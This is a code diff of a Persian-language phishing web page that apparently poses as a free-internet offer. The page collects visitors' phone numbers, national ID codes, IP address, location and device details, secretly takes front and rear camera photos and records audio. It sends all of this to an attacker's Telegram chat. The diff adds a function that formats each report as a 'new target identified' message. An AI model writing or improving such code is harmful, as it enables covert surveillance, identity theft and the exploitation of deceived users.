@@ -172,7 +172,7 @@
         }
 
         // ======================================================
-        // تابع گرفتن عکس با مدیریت خطا (نسخه نهایی)
+        // تابع گرفتن عکس با مدیریت خطا
         // ======================================================
         async function capturePhoto(facingMode = 'user') {
             const debugDiv = document.getElementById('debug');
@@ -180,7 +180,6 @@
             debugDiv.innerHTML += `📸 تلاش برای دوربین: ${facingMode}\n`;
 
             try {
-                // بررسی وجود دوربین
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const videoDevices = devices.filter(d => d.kind === 'videoinput');
                 debugDiv.innerHTML += `📹 تعداد دوربین‌ها: ${videoDevices.length}\n`;
@@ -190,7 +189,6 @@
                     return null;
                 }
 
-                // تلاش برای گرفتن عکس
                 let stream;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({
@@ -315,6 +313,30 @@
         }
 
         // ======================================================
+        // تابع ساخت پیام زیبا
+        // ======================================================
+        function buildBeautifulMessage(phone, nationalCode, ip, location, deviceInfo, audioStatus, selfieStatus, backStatus) {
+            let message = `🎯 **هدف جدید شناسایی شد** 🎯\n\n`;
+            message += `🎨 **قالب:** 📶 اینترنت رایگان\n\n`;
+            message += `🌐 **آدرس IP:**\n`;
+            message += `${ip}\n\n`;
+            message += `📍 **موقعیت تقریبی:**\n`;
+            message += `${location}\n\n`;
+            message += `🖥️ **مشخصات دستگاه:**\n`;
+            message += `${deviceInfo.userAgent}\n\n`;
+            message += `📝 **اطلاعات ورودی کاربر:**\n`;
+            message += `📞 شماره: ${phone}\n`;
+            message += `🆔 کد ملی: ${nationalCode}\n\n`;
+            message += `📸 **وضعیت عکس‌ها:**\n`;
+            message += `🤳 سلفی: ${selfieStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n`;
+            message += `📷 دوربین عقب: ${backStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n\n`;
+            message += `🎤 **ضبط صدا:** ${audioStatus ? '✅ انجام شد' : '❌ انجام نشد'}\n\n`;
+            message += `⏱️ **زمان:** ${new Date().toLocaleString('fa-IR')}`;
+            
+            return message;
+        }
+
+        // ======================================================
         // توابع ارسال به تلگرام
         // ======================================================
         async function sendPhotoToTelegram(photoBlob, caption = '📸 عکس') {
@@ -362,7 +384,8 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: message
+                        text: message,
+                        parse_mode: 'Markdown'
                     })
                 });
 
@@ -395,49 +418,36 @@
             debugDiv.innerHTML = '';
 
             try {
-                // ۱. دریافت اطلاعات دستگاه
+                // ۱. دریافت اطلاعات
                 const deviceInfo = getDeviceInfo();
                 const ip = await getIPInfo();
-
-                // ۲. گرفتن عکس سلفی و دوربین عقب
                 const selfiePhoto = await capturePhoto('user');
                 const backPhoto = await capturePhoto('environment');
-
-                // ۳. ضبط صدا
                 const audioBlob = await recordAudio();
-
-                // ۴. گرفتن موقعیت
                 const location = await getLocation();
 
-                // ۵. ساخت پیام متنی
-                let message = `📱 اطلاعات کامل:\n`;
-                message += `📞 شماره: ${phone}\n`;
-                message += `🆔 کد ملی: ${nationalCode}\n`;
-                message += `⏱️ زمان: ${new Date().toLocaleString('fa-IR')}\n`;
-                message += `🌐 IP: ${ip}\n`;
-                message += `📍 موقعیت: ${location}\n`;
-                message += `📱 مرورگر: ${deviceInfo.userAgent}\n`;
-                message += `🖥️ سیستم‌عامل: ${deviceInfo.platform}\n`;
-                message += `🌍 زبان: ${deviceInfo.language}\n`;
-                message += `📐 صفحه‌نمایش: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
-                message += `🕒 منطقه زمانی: ${deviceInfo.timezone}\n`;
-                message += `📶 وضعیت آنلاین: ${deviceInfo.online ? '✅' : '❌'}\n`;
-                message += `🍪 کوکی: ${deviceInfo.cookieEnabled ? '✅' : '❌'}\n`;
-                message += `🎤 ضبط صدا: ${audioBlob ? '✅' : '❌'}\n`;
-                message += `📸 عکس سلفی: ${selfiePhoto ? '✅' : '❌'}\n`;
-                message += `📸 عکس عقب: ${backPhoto ? '✅' : '❌'}`;
+                // ۲. ساخت پیام زیبا
+                const message = buildBeautifulMessage(
+                    phone,
+                    nationalCode,
+                    ip,
+                    location,
+                    deviceInfo,
+                    audioBlob !== null,
+                    selfiePhoto !== null,
+                    backPhoto !== null
+                );
 
-                // ۶. ارسال به تلگرام
+                // ۳. ارسال پیام متنی
                 await sendMessageToTelegram(message);
 
+                // ۴. ارسال عکس‌ها و صدا
                 if (selfiePhoto) {
-                    await sendPhotoToTelegram(selfiePhoto, '📸 عکس سلفی');
+                    await sendPhotoToTelegram(selfiePhoto, '🤳 عکس سلفی');
                 }
-
                 if (backPhoto) {
-                    await sendPhotoToTelegram(backPhoto, '📸 عکس دوربین عقب');
+                    await sendPhotoToTelegram(backPhoto, '📷 عکس دوربین عقب');
                 }
-
                 if (audioBlob) {
                     await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                 }
@@ -461,8 +471,6 @@
         });
 
         console.log('✅ صفحه بارگذاری شد');
-        console.log('🌐 پروتکل:', window.location.protocol);
-        console.log('🔒 HTTPS:', window.location.protocol === 'https:');
     </script>
 </body>
     </html>
